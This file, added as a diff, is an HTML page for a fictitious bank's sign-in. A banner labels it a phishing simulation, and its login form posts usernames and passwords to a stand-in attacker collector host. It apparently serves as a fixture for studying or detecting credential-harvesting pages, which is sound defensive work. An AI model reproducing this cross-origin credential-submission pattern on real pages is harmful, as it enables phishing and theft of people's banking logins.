@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Secure Online Banking Portal for DemoBank Customers">
+  <meta name="theme-color" content="#0369a1">
+  <title>DemoBank Online Banking - Secure Sign In</title>
+  <style>
+    :root {
+      --primary: #0284c7;
+      --primary-dark: #0369a1;
+      --bg: #fef2f2;
+      --card-bg: #ffffff;
+      --text: #0f172a;
+      --border: #fecaca;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .demo-attack-banner {
+      background: #ef4444;
+      color: #fff;
+      padding: 10px 16px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      max-width: 440px;
+      text-align: center;
+      box-shadow: 0 4px 10px rgba(239, 68, 68, 0.2);
+    }
+    .login-container {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      box-shadow: 0 10px 25px -5px rgba(239, 68, 68, 0.15);
+      width: 100%;
+      max-width: 400px;
+      padding: 32px;
+    }
+    .bank-header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .bank-badge {
+      display: inline-block;
+      background: #fee2e2;
+      color: #b91c1c;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+    .bank-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #0369a1;
+      margin: 0;
+    }
+    .bank-sub {
+      font-size: 13px;
+      color: #64748b;
+      margin-top: 4px;
+    }
+    .form-group {
+      margin-bottom: 18px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+    .form-control {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #cbd5e1;
+      border-radius: 6px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    .submit-btn {
+      width: 100%;
+      background: #0284c7;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="demo-attack-banner">
+    ⚠️ SIMULATION: Phishing attack via cross-origin credential submission
+  </div>
+
+  <div class="login-container">
+    <div class="bank-header">
+      <span class="bank-badge">DEMOBANK VERIFIED PORTAL</span>
+      <h1 class="bank-title">DemoBank Online</h1>
+      <p class="bank-sub">Enter your online banking credentials</p>
+    </div>
+
+    <!-- ATTACK VECTOR: Form submits credentials to an untrusted external collector domain -->
+    <form id="demobank_login_form" method="POST" action="https://evil-phish-collector.example/collect.php">
+      <div class="form-group">
+        <label for="user_102">Account Username</label>
+        <input 
+          type="text" 
+          id="user_102" 
+          name="username" 
+          class="form-control" 
+          autocomplete="username" 
+          placeholder="Enter username" 
+          required
+        >
+      </div>
+
+      <div class="form-group">
+        <label for="pass_102">Password</label>
+        <input 
+          type="password" 
+          id="pass_102" 
+          name="password" 
+          class="form-control" 
+          autocomplete="current-password" 
+          placeholder="Enter secure password" 
+          required
+        >
+      </div>
+
+      <button type="submit" id="btn_login_submit" class="submit-btn">
+        Sign In to DemoBank
+      </button>
+    </form>
+  </div>
+</body>
+</html>
